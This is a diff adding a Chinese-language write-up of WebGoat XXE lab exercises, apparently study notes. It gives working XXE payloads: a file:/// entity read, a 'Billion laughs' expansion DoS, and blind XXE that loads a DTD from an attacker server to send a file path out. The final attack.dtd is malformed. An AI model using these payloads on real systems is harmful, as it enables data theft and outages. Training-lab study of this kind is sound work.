@@ -463,7 +463,153 @@ ps.getString(2,mail);
 最后发现ip为104.130.219.202
 
 
+### XXE
+
+XXE指XML external entity 攻击。
+
+一个Xml实体是某个在XML解析时可以用其他内容替代的标签。通常有3种：
+- 内部实体
+- 外部实体
+- 参数实体
+
+一个实体必须在文档类型定义（DTD）中生成，下面是一个例子：
+```xml
+<?xml version="1.0" standalone="yes">
+<!DOCTYPE author [
+  <!ELEMENT author (#PCDATA)>
+  <!ENTITY js "Jo Smith">
+]>
+<author>&js;</author>
+```
+这样，无论在哪儿出现实体```&js;```，解析器都会将他替换为该实体定义的值。
+
+XXE注入攻击是针对某些解析XML输入的应用程序的攻击。在XML输入中包含对外部实体引用时且使用了有缺陷的XML parser，这类攻击就可能发生。攻击会导致机密数据的泄露、服务器端请求伪造（ssrf）、从部署解析器的机器进行端口扫描、其他系统影响。
+
+有些时候，一个含有客户端内存冲突问题漏洞的XML处理库，可能被利用引用一个恶意的URI，可能会导致在当前应用账户下的任意代码执行。
+
+通常我们区别XXE攻击为以下类型：
+- 经典：这种类型是一个外部实体被包含在本地DTD中。
+- 盲注：响应中没有输出或错误。
+- 错误：尝试得到错误消息中的信息。
+
+#### 第一题
+提交表单，在评论输入框执行XXE注入，尝试浏览系统根目录.
+
+先抓包，看到POST表单是一个xml：```<?xml version="1.0"?><comment>  <text>1</text></comment>```
+
+按照上面的介绍，先定义一个DTD，然后修改这个表单提交内容。例如：
+
+```<!DOCTYPE hehe [ <!ENTITY ls  "file:///">]>```
+
+```<?xml version="1.0"?><!DOCTYPE hehe [ <!ENTITY ls SYSTEM "file:///">]><comment><text>&ls;</text></comment>```
+
+这里还是要了解外部实体定义的语法方式。
 
 
+#### 第二题
+现代REST方式，服务器能够接受开发人员想不到的格式数据。所以这可能导致JSON端点存在XXE攻击漏洞。
+
+尝试执行XML注入。
+
+这里主要是需要把request header中的参数修改如下：
+```Content-Type: application/json``` 
+改为：```Content-Type: application/xml```
+
+然后将post表单处的```{"text":"123"}```这样的json改为：```<?xml version="1.0"?><!DOCTYPE some_name [ <!ENTITY some_ent SYSTEM "file:///">]><comment><text>&some_ent;</text></comment>```
+
+手动修改后，提交即可。
+
+#### XXE DoS 攻击
+使用 XXE 可以执行 DoS 攻击。例如：
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+ <!ENTITY lol "lol">
+ <!ELEMENT lolz (#PCDATA)>
+ <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+ <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+ <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+ <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+ <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+ <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+ <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+ <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+ <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+]>
+<lolz>&lol9;</lolz>
+```
+
+当 XML 解释器调用这个文档时，它看到文档包含一个根元素 lolz, 而lolz包含文本 ```&lol9;``` 。
+
+然而```&lol9;```是一个实体，可扩展为 10个 ```&lol8;``` 字符串；每个 ```&lol8;``` 又可以扩展为10个 ```&lol7;```...... 以此类推，这个小xml最后会占用3GB的内存。上面这个方式被称为“Billion laughs”
+
+#### 盲注 XXE
+
+有时注入XXE看不到输出结果，或者你尝试读的资源包含非法字符，导致解析器失效。这时就要使用盲注技术。
+
+下面的例子我们引用了一个在自己服务器上的外部DTD.
+
+作为攻击者，你使用WebWolf（也可以是任何你控制的服务器），你可以尝试使用 http://10.10.10.129:9090/landing 连接它.
+
+我们如何使用这个端点验证是否可以执行XXE？我们可以使用 WebWolf 来host 一个名为 attack.dtd 文件，这个文件包含下列内容：
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY ping SYSTEM 'http://10.10.10.129:9090/landing'>
+```
+
+然后，提交表单改变这个xml：
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root[
+  <!ENTITY % remote SYSTEM "http://10.10.10.129:9090/WebWolf/files/attack.dtd">
+  %remote; 
+]>
+<comment>
+  <text>test&ping;</text>
+</comment>
+
+```
+上面```%remote;``` 加载了外部实体 ping，所以下面的元素中可以使用这个实体。
+
+现在在WebWolf浏览到 ‘Incoming requests’ 而你会看到：
+```json
+{
+  "method" : "GET",
+  "path" : "/landing",
+  "headers" : {
+    "request" : {
+      "user-agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0",
+    },
+  },
+  "parameters" : {
+    "test" : [ "HelloWorld" ],
+  },
+  "timeTaken" : "1"
+}
+```
+
+所以，使用这个XXE我们能够ping 自己的服务器，意味着 XXE 注入是可能的。使用XXE注入，我们能够看到一些使用curl命令相同的效果。
+
+#### 第3题
+
+在自己设定的一个目录下存入 attack.dtd 和 landing/index.html ,然后使用```python http.server 9999```启动一个简单的http服务器。
 
 
+attack.dtd
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE some_name [ 
+  <!ENTITY ping SYSTEM "http://10.10.10.129:9999/landing?text=/home/webgoat/.webgo>
+]>
+
+```
+
+landing/index.html 要有接收上传文件能力。
+
+然后捕捉包，改写post表单为：
+```xml
+<?xml version="1.0"?><!DOCTYPE some_name [ <!ENTITY % some_ent SYSTEM "http://10.10.10.129:9999/attack.dtd">%some_ent;]> <comment>  <text>111222&ping;</text></comment>
+```
